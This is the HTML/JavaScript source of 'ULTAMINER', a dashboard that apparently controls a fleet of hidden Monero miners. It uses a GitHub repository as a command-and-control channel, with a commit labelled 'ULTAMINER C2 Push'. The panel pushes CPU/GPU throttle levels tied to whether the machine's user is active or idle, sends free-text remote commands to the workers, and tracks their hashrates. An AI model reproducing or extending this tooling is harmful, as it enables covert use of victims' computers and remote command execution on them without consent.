<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ULTAMINER - Control Panel</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root { --bg: #050505; --card-bg: #121212; --accent: #ffffff; --text: #e0e0e0; --dim: #808080; --border: #252525; --green: #00ff88; --red: #ff4444; }
* { box-sizing: border-box; margin: 0; padding: 0; }
body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow-x: hidden; }
#stars { position: fixed; inset: 0; z-index: -1; opacity: 0.7; }

.navbar { display: flex; justify-content: space-between; align-items: center; padding: 25px 50px; background: rgba(5,5,5,0.9); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
.logo { font-size: 20px; font-weight: 800; letter-spacing: 3px; color: var(--accent); display: flex; align-items: center; gap: 12px; text-transform: uppercase; }
.logo i { color: var(--accent); font-size: 24px; }
.nav-actions { display: flex; gap: 15px; align-items: center; }
.badge { background: #1a1a1a; padding: 5px 12px; border-radius: 4px; font-size: 11px; font-weight: 700; color: #aaa; border: 1px solid #333; }
.btn-logout { background: transparent; border: 1px solid #333; color: #fff; padding: 6px 15px; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: 600; }

.container { max-width: 1000px; margin: 40px auto; padding: 0 20px; display: flex; flex-direction: column; gap: 25px; }
.card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
.card-header { display: flex; align-items: center; gap: 12px; margin-bottom: 30px; font-size: 13px; font-weight: 800; color: var(--accent); text-transform: uppercase; letter-spacing: 1.5px; opacity: 0.9; }

/* Fleet Status Grid */
.stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; background: var(--border); border-radius: 12px; overflow: hidden; border: 1px solid var(--border); }
.stat-box { background: var(--card-bg); padding: 30px 10px; text-align: center; }
.stat-value { font-size: 32px; font-weight: 800; color: #fff; line-height: 1; margin-bottom: 10px; }
.stat-label { font-size: 10px; color: var(--dim); font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }

/* Admin Setup */
.input-group { display: flex; gap: 15px; align-items: flex-end; }
.form-item { flex: 1; }
.form-item label { display: block; font-size: 10px; font-weight: 700; color: var(--dim); margin-bottom: 10px; text-transform: uppercase; }
input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 12px 15px; border-radius: 8px; font-family: inherit; font-size: 14px; outline: none; }
input:focus { border-color: #555; }
.btn-primary { background: #fff; color: #000; border: none; padding: 12px 25px; border-radius: 8px; font-weight: 800; font-size: 12px; text-transform: uppercase; cursor: pointer; transition: 0.2s; }
.btn-primary:hover { transform: scale(1.02); background: #eee; }

/* Global Defaults */
.defaults-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; }
.config-section { }
.section-title { display: flex; align-items: center; gap: 10px; font-size: 11px; font-weight: 800; margin-bottom: 25px; }
.dot { width: 8px; height: 8px; border-radius: 50%; }
.slider-container { margin-bottom: 25px; }
.slider-meta { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 12px; font-weight: 600; }
.slider-meta span:first-child { color: var(--dim); text-transform: uppercase; font-size: 11px; }
input[type="range"] { width: 100%; height: 3px; background: #333; appearance: none; border-radius: 2px; }
input[type="range"]::-webkit-slider-thumb { appearance: none; width: 16px; height: 16px; background: #fff; border-radius: 50%; border: 3px solid #000; cursor: pointer; box-shadow: 0 0 10px rgba(255,255,255,0.2); }

/* Master Switch */
.master-bar { margin-top: 20px; padding-top: 30px; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
.switch-label { display: flex; align-items: center; gap: 15px; font-size: 13px; font-weight: 800; text-transform: uppercase; }
.switch-label i { color: #f39c12; }
.switch { position: relative; width: 50px; height: 26px; }
.switch input { opacity: 0; width: 0; height: 0; }
.slider-round { position: absolute; cursor: pointer; inset: 0; background: #222; transition: 0.4s; border-radius: 34px; border: 1px solid #333; }
.slider-round:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background: #fff; transition: 0.4s; border-radius: 50%; }
input:checked + .slider-round { background: #fff; }
input:checked + .slider-round:before { transform: translateX(24px); background: #000; }

/* Workers */
.worker-card { background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 20px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; transition: 0.3s; }
.worker-main { display: flex; align-items: center; gap: 18px; }
.worker-name { font-weight: 800; font-size: 15px; text-transform: uppercase; letter-spacing: 0.5px; }
.worker-id { display: flex; gap: 15px; margin-top: 6px; }
.worker-id span { font-size: 11px; color: var(--dim); display: flex; align-items: center; gap: 6px; font-weight: 600; }
.worker-id i { font-size: 12px; }
.worker-output { text-align: right; }
.output-val { font-size: 20px; font-weight: 800; line-height: 1; }
.output-unit { font-size: 10px; color: var(--dim); margin-top: 5px; font-weight: 700; text-transform: uppercase; }

/* Login Overlay */
#login-overlay { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
.login-box { width: 100%; max-width: 400px; text-align: center; }

#dash-content { opacity: 0; pointer-events: none; transition: 0.5s; }
#dash-content.visible { opacity: 1; pointer-events: all; }

.worker-add-row { display: flex; gap: 15px; margin-bottom: 25px; }
.worker-add-row input { background: #080808; border-style: dashed; }
</style>
</head>
<body>

<canvas id="stars"></canvas>

<div id="login-overlay">
    <div class="login-box">
        <h1 class="logo" style="justify-content: center; margin-bottom: 40px;"><i class="fas fa-pickaxe"></i> ULTAMINER</h1>
        <div style="padding: 0 40px;">
            <label style="display:block; text-align:left; font-size:10px; font-weight:700; color:var(--dim); margin-bottom:10px; text-transform:uppercase;">Initialization Token</label>
            <input type="password" id="tokenIn" placeholder="Enter GitHub PAT">
            <button class="btn-primary" style="width:100%; margin-top:20px;" onclick="doLogin()">Authorize</button>
        </div>
    </div>
</div>

<div id="dash-content">
    <div class="navbar">
        <div class="logo"><i class="fas fa-pickaxe"></i> ULTAMINER</div>
        <div class="nav-actions">
            <span class="badge">ADMIN</span>
            <span class="badge" style="color:#fff">v2.8</span>
            <button class="btn-logout" onclick="logout()">Logout</button>
        </div>
    </div>

    <div class="container">
        <!-- Fleet Status -->
        <div class="stats-grid">
            <div class="stat-box">
                <div class="stat-value" id="totHash">0.0</div>
                <div class="stat-label">Total H/S</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="estXmr">0.00000000</div>
                <div class="stat-label">EST XMR / 24H</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="activeNodes">0</div>
                <div class="stat-label">Active Workers</div>
            </div>
        </div>

        <!-- Setup Card -->
        <div class="card">
            <div class="card-header"><i class="fas fa-wrench"></i> Admin Setup</div>
            <div class="input-group">
                <div class="form-item">
                    <label>GitHub Personal Access Token</label>
                    <input type="password" id="tokenDisplay" readonly style="color:#555">
                </div>
                <div class="form-item" style="flex: 0.5">
                    <label>Repo</label>
                    <input type="text" value="HolyV200/test-repo" readonly style="color:#555">
                </div>
                <button class="btn-primary" onclick="logout()">Update</button>
            </div>
        </div>

        <!-- Global Configuration -->
        <div class="card">
            <div class="card-header"><i class="fas fa-bolt"></i> Global Defaults</div>
            <div class="defaults-grid">
                <div class="config-section">
                    <div class="section-title"><div class="dot" style="background:var(--green)"></div> USER ACTIVE</div>
                    <div class="slider-container">
                        <div class="slider-meta"><span>CPU</span><span id="ca_val">10%</span></div>
                        <input type="range" id="cfg_ca" min="0" max="100" oninput="document.getElementById('ca_val').innerText=this.value+'%'">
                    </div>
                    <div class="slider-container">
                        <div class="slider-meta"><span>GPU</span><span id="ga_val">8</span></div>
                        <input type="range" id="cfg_ga" min="0" max="100" oninput="document.getElementById('ga_val').innerText=this.value">
                    </div>
                </div>
                <div class="config-section">
                    <div class="section-title"><div class="dot" style="background:#f39c12"></div> USER IDLE</div>
                    <div class="slider-container">
                        <div class="slider-meta"><span>CPU</span><span id="ci_val">35%</span></div>
                        <input type="range" id="cfg_ci" min="0" max="100" oninput="document.getElementById('ci_val').innerText=this.value+'%'">
                    </div>
                    <div class="slider-container">
                        <div class="slider-meta"><span>GPU</span><span id="gi_val">25</span></div>
                        <input type="range" id="cfg_gi" min="0" max="100" oninput="document.getElementById('gi_val').innerText=this.value">
                    </div>
                </div>
            </div>
            
            <div class="master-bar">
                <div class="switch-label"><i class="fas fa-bolt"></i> Master Switch
                    <label class="switch">
                        <input type="checkbox" id="cfg_enabled" checked>
                        <span class="slider-round"></span>
                    </label>
                </div>
                <div style="display:flex; gap:15px; align-items:center;">
                    <input type="text" id="cfg_cmd" placeholder="Remote Command..." style="width:250px; background:#080808">
                    <button class="btn-primary" onclick="saveConfig()">Push Config</button>
                </div>
            </div>
        </div>

        <!-- Worker Telemetry -->
        <div class="card">
            <div class="card-header"><i class="fas fa-users"></i> Workers</div>
            <div class="worker-add-row">
                <input type="text" placeholder="Worker Name Override..." id="workerAdd">
                <button class="btn-primary" style="background:#1a1a1a; color:#fff; border:1px solid #333;">+ Add</button>
            </div>
            <div id="workerList">
                <div style="text-align:center; padding:40px; color:var(--dim); font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:1px;">Awaiting node synchronization...</div>
            </div>
        </div>
    </div>
</div>

<script>
// Starfield Engine
const canvas = document.getElementById('stars');
const ctx = canvas.getContext('2d');
let w, h, stars = [];
function initStars() {
    w = canvas.width = window.innerWidth;
    h = canvas.height = window.innerHeight;
    stars = [];
    for(let i=0; i<300; i++) stars.push({x: Math.random()*w, y: Math.random()*h, z: Math.random()*w});
}
function drawStars() {
    ctx.fillStyle = '#050505';
    ctx.fillRect(0,0,w,h);
    for(let s of stars) {
        s.z -= 0.8;
        if(s.z <= 0) s.z = w;
        const k = 128.0 / s.z, px = (s.x - w/2) * k + w/2, py = (s.y - h/2) * k + h/2;
        if(px>=0 && px<=w && py>=0 && py<=h) {
            const alpha = (1 - s.z/w);
            ctx.fillStyle = `rgba(255,255,255,${alpha})`;
            ctx.beginPath(); ctx.arc(px, py, (1-s.z/w)*1.5, 0, Math.PI*2); ctx.fill();
        }
    }
    requestAnimationFrame(drawStars);
}
window.addEventListener('resize', initStars);
initStars(); drawStars();

// Logic
const REPO = 'HolyV200/test-repo';
let PAT = localStorage.getItem('gh_pat') || '';
let currentConfig = {};
let configSha = '';

if(PAT) {
    document.getElementById('login-overlay').style.display = 'none';
    document.getElementById('dash-content').classList.add('visible');
    document.getElementById('tokenDisplay').value = PAT.substring(0,8) + '********************';
    fetchData();
}

function doLogin() {
    PAT = document.getElementById('tokenIn').value.trim();
    if(PAT) {
        localStorage.setItem('gh_pat', PAT);
        location.reload();
    }
}

function logout() {
    localStorage.removeItem('gh_pat');
    location.reload();
}

async function fetchData() {
    await fetchConfig();
    await fetchWorkers();
}

async function fetchConfig() {
    try {
        const r = await fetch(`https://api.github.com/repos/${REPO}/contents/config.json`, {
            headers: {'Authorization': 'token '+PAT, 'Accept': 'application/vnd.github.v3.raw'}
        });
        if(r.ok) {
            currentConfig = await r.json();
            document.getElementById('cfg_ca').value = currentConfig.cpu_active || 10;
            document.getElementById('ca_val').innerText = (currentConfig.cpu_active || 10) + '%';
            document.getElementById('cfg_ci').value = currentConfig.cpu_idle || 35;
            document.getElementById('ci_val').innerText = (currentConfig.cpu_idle || 35) + '%';
            document.getElementById('cfg_ga').value = currentConfig.gpu_active || 8;
            document.getElementById('ga_val').innerText = currentConfig.gpu_active || 8;
            document.getElementById('cfg_gi').value = currentConfig.gpu_idle || 25;
            document.getElementById('gi_val').innerText = currentConfig.gpu_idle || 25;
            document.getElementById('cfg_enabled').checked = currentConfig.enabled !== false;
            document.getElementById('cfg_cmd').value = currentConfig.cmd || "";
        }
        
        const rMeta = await fetch(`https://api.github.com/repos/${REPO}/contents/config.json`, {
            headers: {'Authorization': 'token '+PAT}
        });
        if(rMeta.ok) {
            const m = await rMeta.json();
            configSha = m.sha;
        }
    } catch(e) {}
}

async function saveConfig() {
    if(!configSha) {
        alert('Error: No Config SHA. Try refreshing.');
        return;
    }
    
    currentConfig.cpu_active = parseInt(document.getElementById('cfg_ca').value);
    currentConfig.cpu_idle = parseInt(document.getElementById('cfg_ci').value);
    currentConfig.gpu_active = parseInt(document.getElementById('cfg_ga').value);
    currentConfig.gpu_idle = parseInt(document.getElementById('cfg_gi').value);
    currentConfig.enabled = document.getElementById('cfg_enabled').checked;
    
    const newCmd = document.getElementById('cfg_cmd').value;
    if(newCmd !== currentConfig.cmd) {
        currentConfig.cmd = newCmd;
        currentConfig.cmd_id = (currentConfig.cmd_id || 0) + 1;
    }
    
    try {
        const res = await fetch(`https://api.github.com/repos/${REPO}/contents/config.json`, {
            method: 'PUT',
            headers: {'Authorization': 'token '+PAT, 'Content-Type': 'application/json'},
            body: JSON.stringify({
                message: "ULTAMINER C2 Push",
                content: btoa(JSON.stringify(currentConfig, null, 2)),
                sha: configSha
            })
        });
        if(res.ok) {
            alert('CONFIGURATION PUSHED');
            fetchConfig(); // update SHA
        } else {
            const err = await res.json();
            alert('PUSH FAILED: ' + err.message);
        }
    } catch(e) { alert('NETWORK ERROR'); }
}

async function fetchWorkers() {
    try {
        const r = await fetch(`https://api.github.com/repos/${REPO}/contents/status`, {
            headers: {'Authorization': 'token '+PAT}
        });
        if(!r.ok) return;
        const files = await r.json();
        
        let html = '';
        let totHash = 0;
        let active = 0;
        
        for(let f of files) {
            if(f.name.endsWith('.json')) {
                try {
                    const r2 = await fetch(f.download_url);
                    const st = await r2.json();
                    const age = (Date.now() - new Date(st.ts).getTime()) / 1000;
                    const isOnline = age < 600;
                    
                    if(isOnline) { active++; totHash += st.hashrate || 0; }
                    
                    html += `<div class="worker-card">
                        <div class="worker-main">
                            <div class="dot" style="background:${isOnline ? 'var(--green)' : 'var(--red)'}; box-shadow: 0 0 10px ${isOnline ? 'var(--green)' : 'var(--red)'}"></div>
                            <div>
                                <div class="worker-name">${f.name.replace('.json','')}</div>
                                <div class="worker-id">
                                    <span><i class="fas fa-microchip"></i> ${st.cpu || 'Unknown'}</span>
                                    <span><i class="fas fa-clock"></i> ${Math.round(age/60)}m ago</span>
                                </div>
                            </div>
                        </div>
                        <div class="worker-output">
                            <div class="output-val">${(st.hashrate||0).toFixed(1)}</div>
                            <div class="output-unit">Hash/sec</div>
                        </div>
                    </div>`;
                } catch(e) {}
            }
        }
        
        document.getElementById('workerList').innerHTML = html || '<div style="text-align:center; padding:40px; color:var(--dim)">No nodes active.</div>';
        document.getElementById('totHash').innerText = totHash.toFixed(1);
        document.getElementById('activeNodes').innerText = active;
        document.getElementById('estXmr').innerText = (totHash * 0.0000001).toFixed(8);
    } catch(e) {}
}

setInterval(fetchData, 30000);
</script>
</body>
</html>
